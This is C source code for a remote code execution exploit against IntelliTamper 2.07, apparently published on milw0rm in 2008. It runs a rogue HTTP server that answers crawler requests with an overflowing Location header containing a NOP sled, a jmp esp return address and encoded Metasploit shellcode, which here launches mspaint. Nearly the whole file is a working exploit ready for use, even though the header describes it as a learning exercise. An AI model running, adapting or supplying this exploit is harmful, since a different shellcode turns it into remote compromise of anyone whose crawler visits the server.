/**
 **
 ** IntelliTamper 2.07 Location: HTTP Header Remote Code Execution exploit.
 **
 ** Based on exploit by Koshi (written in Perl). This one should be more
 ** stable. Just for fun and to learn more about win32 exploitation.
 **
 ** by Wojciech Pawlikowski (wojtekp@gmail.com)
 **/

#include <sys/types.h>
#include <sys/socket.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE					1550
#define NOP					0x90
#define RETADDR					0x7c941EED	// jmp esp ntdll.dll

/* win32_exec -  EXITFUNC=thread CMD=mspaint Size=336 Encoder=Alpha2 http://metasploit.com */

unsigned char shellcode[] =
   "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
   "\x49\x48\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x42"
   "\x58\x30\x42\x31\x50\x41\x42\x6b\x41\x41\x52\x41\x32\x41\x41\x32"
   "\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x6d\x39\x59\x6c\x69"
   "\x78\x41\x54\x75\x50\x77\x70\x45\x50\x6c\x4b\x73\x75\x55\x6c\x4e"
   "\x6b\x61\x6c\x33\x35\x54\x38\x55\x51\x7a\x4f\x4c\x4b\x70\x4f\x45"
   "\x48\x4c\x4b\x33\x6f\x67\x50\x45\x51\x4a\x4b\x43\x79\x6c\x4b\x34"
   "\x74\x4c\x4b\x47\x71\x6a\x4e\x64\x71\x6f\x30\x5a\x39\x6e\x4c\x4e"
   "\x64\x4f\x30\x30\x74\x45\x57\x79\x51\x6b\x7a\x74\x4d\x37\x71\x5a"
   "\x62\x4a\x4b\x5a\x54\x55\x6b\x31\x44\x71\x34\x55\x54\x71\x65\x4b"
   "\x55\x6c\x4b\x73\x6f\x61\x34\x45\x51\x78\x6b\x65\x36\x6c\x4b\x36"
   "\x6c\x50\x4b\x4e\x6b\x71\x4f\x57\x6c\x35\x51\x38\x6b\x4c\x4b\x77"
   "\x6c\x6e\x6b\x77\x71\x6a\x4b\x4c\x49\x71\x4c\x37\x54\x34\x44\x7a"
   "\x63\x54\x71\x39\x50\x61\x74\x6c\x4b\x43\x70\x46\x50\x4b\x35\x49"
   "\x50\x72\x58\x46\x6c\x6c\x4b\x47\x30\x36\x6c\x6c\x4b\x70\x70\x37"
   "\x6c\x4e\x4d\x4c\x4b\x65\x38\x46\x68\x7a\x4b\x64\x49\x4e\x6b\x4f"
   "\x70\x6e\x50\x77\x70\x77\x70\x45\x50\x6c\x4b\x70\x68\x37\x4c\x63"
   "\x6f\x64\x71\x49\x66\x73\x50\x31\x46\x6e\x69\x59\x68\x4b\x33\x69"
   "\x50\x51\x6b\x30\x50\x32\x48\x5a\x4f\x5a\x6e\x69\x70\x45\x30\x33"
   "\x58\x4c\x58\x6b\x4e\x4c\x4a\x76\x6e\x66\x37\x6b\x4f\x7a\x47\x30"
   "\x6d\x53\x43\x62\x50\x53\x51\x73\x59\x32\x4e\x33\x44\x45\x50\x42";

int
main(void)
{
  struct sockaddr_in serv_sin, cli_sin;
  int i, sockfd, cli_sock, sock_opt = 1, sin_len;
  char *overflow, buf[BUFSIZE] = { 0 }, req[BUFSIZE + 100] = { 0 };
  
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sockfd < 0)
  {
    perror("socket()");
    exit(-1);
  }
  
  serv_sin.sin_family = AF_INET;
  serv_sin.sin_port = htons(80);
  serv_sin.sin_addr.s_addr = INADDR_ANY;
  
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof(int)) < 0)
  {
    perror("setsockopt()");
    close(sockfd);
    exit(-1);
  }

  if (bind(sockfd, (struct sockaddr *)&serv_sin, sizeof(struct sockaddr)) < 0)
  {
    perror("bind()");
    close(sockfd);
    exit(-1);
  }    

  listen(sockfd, 1);
  sin_len = sizeof(struct sockaddr);

  printf("[*] Waiting for a connection...\n");
  
  while (1)
  {
    cli_sock = accept(sockfd, (struct sockaddr *)&cli_sin, &sin_len);
    if (cli_sock < 0)
    {
      perror("accept()");
      exit(-1);
    }

    printf("[+] Connection from %s:%d\n", inet_ntoa(cli_sin.sin_addr), ntohs(cli_sin.sin_port));

    read(cli_sock, buf, sizeof(buf) - 1);
    overflow = (char *)malloc(BUFSIZE + 1);
    
    for (i = 0; i <= 1540; i += 4)
      *(long *)&overflow[i] = RETADDR;

    for (i = 0; i < 1536; i++)
      overflow[i] = NOP;

    memcpy(overflow + 550, shellcode, strlen(shellcode));
    memcpy(overflow + i + 4, "\xe9\x14\xfc\xff\xff", 5);			// jmp -1000 - jump to our buffer

    i = sprintf(req, "200 HTTP/1.1\r\nDate: 2008-07-24 20:14:31\r\nLocation: ");
    memcpy(req + i, overflow, strlen(overflow));
    memcpy(req + i + strlen(overflow), "\r\n\r\n", 4);

    write(cli_sock, req, strlen(req));

    printf("[+] Exploit sent!\n");

    close(cli_sock);
  }

  close(sockfd);
}

// milw0rm.com [2008-08-10]
